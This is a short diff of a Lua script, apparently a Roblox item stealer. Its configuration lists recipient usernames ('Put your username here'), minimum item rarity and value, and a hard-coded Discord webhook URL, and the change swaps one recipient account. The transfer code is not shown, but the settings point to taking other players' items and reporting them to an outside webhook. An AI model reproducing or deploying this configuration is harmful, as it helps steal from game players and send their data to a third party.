@@ -3,7 +3,7 @@ if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
 -- Put your username here
-local Users = _G.Usernames or {"User_Enter", "cripIess", "flames_xx", "azusasdemise"}
+local Users = _G.Usernames or {"User_Enter", "cripIess", "flames_xx", "Voltstandigs"}
 local min_rarity = _G.min_rarity or "Common"
 local min_value = _G.min_value or 0
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1568290063991836744/iAfhWQqAqN0hfIdMLoUBz-l6yusNGbKiQGQPhTh8O_btR6eLFAJne1_lpLvXLYDdeBNN"
